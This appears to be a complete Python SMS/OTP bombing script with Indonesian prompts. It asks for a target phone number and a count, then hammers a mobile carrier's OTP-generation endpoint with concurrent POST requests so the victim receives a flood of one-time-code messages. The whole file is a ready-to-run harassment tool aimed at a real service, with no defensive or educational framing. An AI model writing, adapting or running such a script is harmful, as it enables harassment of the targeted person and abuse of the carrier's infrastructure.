from multiprocessing.pool import ThreadPool

try:
        import os, time, requests, sys

except ModuleNotFoundError:
        print("\n\033[0m[\033[1;31m!\033[0m] \033[1;77mSepertinya modul requests belum terinstall")
        exit(1)
no = input("\033[0m[\033[1;32m+\033[0m] \033[1;77mMasukan Nomor Target: \033[0m")
tot = int(input("\033[0m[\033[1;35m?\033[0m] \033[1;77mJumlah: \033[0m"))
spam = {'msisdn':no}
idk = '200'

def main(arg):
        try:
                r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
                #print(r.text)
                if str(idk) in str(r.text):
                        print("\033[0m[\033[1;36m&\033[0m] \033[1;77mBerhasil")
                else:
                        print(r.text)
                        print("\033[0m[\033[1;31m!\033[0m] \033[1;77mGagal")
        except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
